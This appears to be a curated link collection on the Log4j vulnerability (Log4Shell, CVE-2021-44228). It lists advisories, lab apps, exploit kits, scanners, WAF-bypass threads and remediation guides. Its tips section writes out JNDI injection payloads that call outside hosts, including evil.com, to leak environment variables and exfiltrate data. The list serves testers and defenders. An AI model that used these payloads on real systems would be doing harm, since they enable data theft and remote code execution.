# TL;DR

Term | Description
---|---
**Log4j** | The vulnerable Java Library
**JndiLookup** | The vulnerable part of Log4j
**CVE-2021-442228** | The initial vulnerability
**Log4Shell** | The exploit developped to attack this vulnerability
**CVE-2021-45046** | The second vulnerability (bypass that causes denial of service)

[Source: CVE-2021-44228 Log4j (and Log4Shell) Executive Explainer by cje@bugcrowd](https://www.slideshare.net/caseyjohnellis/cve202144228-log4j-and-log4shell-executive-explainer-by-cjebugcrowd) (modified to add the second CVE)

![Log4Shell-timeline](https://user-images.githubusercontent.com/35920302/146178407-14f764fa-a2f9-4024-9265-0aeaa1a03599.png)

[Source: cutekernel.github.io](https://cutekernel.github.io/technical-illustrations/cves-2021.html)

![log4j_attack](https://user-images.githubusercontent.com/35920302/146178704-84116a6f-1016-43c4-b1f3-0552dfa0fb03.png)

[Source: govcert.ch](https://www.govcert.ch/blog/zero-day-exploit-targeting-popular-java-library-log4j/)

![log4shell png](https://user-images.githubusercontent.com/35920302/146170447-915c1f09-8b34-4390-8f1b-95f9cf892c7a.jpeg)

[Source: musana.net](https://musana.net/2021/12/13/log4shell-Quick-Guide/)

# Technical analysis
- [Log4j Analysis: More JNDI Injection](https://y4y.space/2021/12/10/log4j-analysis-more-jndi-injection/)
- [Rapid7 analysis](https://attackerkb.com/topics/in9sPR2Bzt/cve-2021-44228-log4shell/rapid7-analysis): Includes PoCs for Apache Struts2, VMWare VCenter, Apache James, Apache Solr, Apache Druid, Apache JSPWiki and Apache OFBiz

# Advisories
- [Apache Log4j Security Vulnerabilities](https://logging.apache.org/log4j/2.x/security.html)
- [CVE-2021-44228 on NIST](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

# Videos
- [What do you need to know about the log4j (Log4Shell) vulnerability?](https://www.youtube.com/watch?v=oC2PZB5D3Ys) (First 15 min detail offensive side pretty well)
- [Short demo by @MalwareTechBlog](https://www.youtube.com/watch?v=0-abhd-CLwQ)
- [CVE-2021-44228 - Log4j - MINECRAFT VULNERABLE! (and SO MUCH MORE)](https://www.youtube.com/watch?v=7qoPDq41xhQ)
- [Log4Shell, The Worst Java Vulnerability in Years](https://www.youtube.com/watch?v=m_AkCbFc8DM)

# Intentionally vulnerable apps
- [Solar, exploiting log4j (TryHackMe room by @_JohnHammond)](https://tryhackme.com/room/solar)
- [PentesterLab Log4j RCE](https://pentesterlab.com/exercises/log4j_rce/course) & [Log4j RCE II](https://pentesterlab.com/exercises/log4j_rce_ii/course)
- [BugHuntr.io scenario](https://twitter.com/BugHuntrIo/status/1469298538593067012)
- [christophetd/log4shell-vulnerable-app](https://github.com/christophetd/log4shell-vulnerable-app)

# Tools & Exploits
- [woodpecker-appstore/log4j-payload-generator](https://github.com/woodpecker-appstore/log4j-payload-generator)
- [tangxiaofeng7/CVE-2021-44228-Apache-Log4j-Rce](https://github.com/tangxiaofeng7/CVE-2021-44228-Apache-Log4j-Rce)
- [JNDI-Exploit-Kit](https://github.com/pimps/JNDI-Exploit-Kit)
- [Thinkst Canary](https://twitter.com/thinkstcanary/status/1469439743905697797)
- [Huntress Log4Shell Tester](https://log4shell.huntress.com)
- [log4shell.nse](https://github.com/righel/log4shell_nse): Nmap NSE script that injects a Huntress/CanaryTokens/custom log4shell payload in HTTP requests described by JSON templates
- [@SilentSignalHU’s Log4Shell Scanner (Burp extension)](https://twitter.com/Burp_Suite/status/1470418532475314177)
- [ActiveScan++](https://twitter.com/albinowax/status/1469258291616403457)
- [fullhunt/log4j-scan](https://github.com/fullhunt/log4j-scan) & [How to combine it with Amass for higher coverage](https://twitter.com/jeff_foley/status/1470463924260777985)
- [Burp Bounty Pro Profile](https://twitter.com/BurpBounty/status/1469249786092085249)
- [whwlsfb/Log4j2Scan](https://github.com/whwlsfb/Log4j2Scan) (Passive Scanner plugin for Burp)
- [Semgrep rule](https://semgrep.dev/r?q=log4j-message-lookup-injection)
- [CodeQL query](https://github.com/cldrn/codeql-queries/blob/master/log4j-injection.ql)
- [Nuclei template](https://github.com/projectdiscovery/nuclei-templates/blob/master/cves/2021/CVE-2021-44228.yaml)
- [Burp Intruder in Pitchfork mode](https://twitter.com/ITSecurityguard/status/1470187651844161536)
- [LogMePwn](https://github.com/0xInfection/LogMePwn)

# Tips
- [The Log4J formatting is nestable which means payloads like `${jndi:ldap://${env:user}.xyz.collab.com/a}` will leak server side env vars](https://twitter.com/_StaticFlow_/status/1469358229767475205)
- [Tutorial on setting up RogueJDNI](https://twitter.com/ITSecurityguard/status/1469347404986077185)
- [Class path is useful information to have to know what gadgets should be available or where you need to look for some to get rce.](https://twitter.com/jstnkndy/status/1469752457618202624)
- [Some events are only logged when an exception occur, so specially long payloads with unexpected characters may help you trigger those exceptions.](https://twitter.com/pwntester/status/1470435811812380675)
- [If you omit the closing brace `}` (so the payload would look like `${jndi:ldap://evil.com/`), you will potentially get a bunch of data exfiltrated to your server until the next `}` appears in that data](https://twitter.com/TomAnthonySEO/status/1470374984749133825)
- [Attack path works in *ANY* java version](https://twitter.com/marcioalm/status/1470361495405875200)
- [If you’re scanning for Log4Shell at scale, you can easily determine which host is pinging back by adding it to the start of your callback hostname](https://twitter.com/hakluke/status/1469875175839584257)

# WAF bypasses
- <https://twitter.com/wugeej/status/1469982901412728832>
- <https://twitter.com/BountyOverflow/status/1470001858873802754>
- <https://twitter.com/h4x0r_dz/status/1469663187079417857>
- <https://twitter.com/ymzkei5/status/1469765165348704256>
- <https://twitter.com/wireghoul/status/1469473975449255941>
- <https://twitter.com/Rezn0k/status/1469523006015750146>
- <https://twitter.com/Laughing_Mantis/status/1470526083271303172>

# Mega threads
- [Reddit mega thread curated by NCC Group](https://www.reddit.com/r/blueteamsec/comments/rd38z9/log4j_0day_being_exploited/)

# Remediation
- [Guide: How To Detect and Mitigate the Log4Shell Vulnerability (CVE-2021-44228)](https://www.lunasec.io/docs/blog/log4j-zero-day-mitigation-guide/)

# Some vulnerable apps/vendors
- [YfryTchsGD/Log4jAttackSurface](https://github.com/YfryTchsGD/Log4jAttackSurface)
- [20211210-TLP-WHITE_LOG4J.md](https://gist.github.com/SwitHak/b66db3a06c2955a9cb71a8718970c592)
- [NCSC-NL/log4shell](https://github.com/NCSC-NL/log4shell/blob/main/software/README.md)
- [ZAP](https://www.zaproxy.org/blog/2021-12-10-zap-and-log4shell/)
- [Ingenuity, the Mars 2020 Helicopter mssion](https://twitter.com/TheASF/status/1400875147163279374)
- [VCenter](https://twitter.com/w3bd3vil/status/1469814463414951937)
- [Ghidra](https://twitter.com/zhuowei/status/1469186818549719042)
- [Apache JAMES SMTP server](https://twitter.com/dlitchfield/status/1469809966785564675)

# TODO
Add headers, payloads, data that can be exfiltarted, entry point examples & tools to receive OOB DNS requests.
